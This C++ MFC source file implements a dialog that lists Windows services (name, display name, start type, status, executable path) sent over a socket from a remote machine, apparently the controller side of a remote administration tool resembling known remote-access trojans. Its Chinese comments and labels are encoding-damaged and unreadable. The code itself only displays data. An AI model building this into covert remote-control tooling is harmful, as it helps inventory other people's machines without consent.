// ServerDlg.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "Remote.h"
#include "ServerDlg.h"
#include "afxdialogex.h"
#include "Common.h"


// CServerDlg �Ի���

IMPLEMENT_DYNAMIC(CServerDlg, CDialog)

CServerDlg::CServerDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext *pContext)
	: CDialog(CServerDlg::IDD, pParent)
{
	m_iocpServer = pIOCPServer;
	m_pContext = pContext;
}

CServerDlg::~CServerDlg()
{
}

void CServerDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_LIST, m_list);
}


BEGIN_MESSAGE_MAP(CServerDlg, CDialog)
END_MESSAGE_MAP()


// CServerDlg ��Ϣ�������


BOOL CServerDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	CString str;
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
	str.Format("\\\\%s - �������", bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "");
	SetWindowText(str);


	m_list.SetExtendedStyle(/*LVS_EX_FLATSB |*/ LVS_EX_FULLROWSELECT);
	m_list.InsertColumn(0, "��ʵ����", LVCFMT_LEFT, 150);
	m_list.InsertColumn(1, "��ʾ����", LVCFMT_LEFT, 260);
	m_list.InsertColumn(2, "��������", LVCFMT_LEFT, 80);
	m_list.InsertColumn(3, "����״̬", LVCFMT_LEFT, 80);
	m_list.InsertColumn(4, "��ִ���ļ�·��", LVCFMT_LEFT, 260);
	
	ShowServiceList();

	return TRUE;  // return TRUE unless you set the focus to a control
	// �쳣: OCX ����ҳӦ���� FALSE
}



void CServerDlg::OnReceiveComplete(void)
{
	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_SERVERLIST:
		ShowServiceList();
		break;
	default:
		// ���䷢���쳣����
		break;
	}
}



int CServerDlg::ShowServiceList(void)
{
	char	*lpBuffer = (char *)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	char	*DisplayName;
	char	*ServiceName;
	char	*serRunway;
	char	*serauto;
	char	*serfile;
	DWORD	dwOffset = 0;
	m_list.DeleteAllItems();

	for (int i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
	{
		DisplayName = lpBuffer + dwOffset;
		ServiceName = DisplayName + lstrlen(DisplayName) +1;
		serfile= ServiceName + lstrlen(ServiceName) +1;
		serRunway = serfile + lstrlen(serfile) + 1;
		serauto = serRunway + lstrlen(serRunway) + 1;

		m_list.InsertItem(i, ServiceName);
		m_list.SetItemText(i, 1, DisplayName);
		m_list.SetItemText(i, 2, serauto);		
		m_list.SetItemText(i, 3, serRunway);
		m_list.SetItemText(i, 4, serfile );

		dwOffset += lstrlen(DisplayName) + lstrlen(ServiceName) + lstrlen(serfile) + lstrlen(serRunway)
			+ lstrlen(serauto) +5;
	}

	return 0;
}

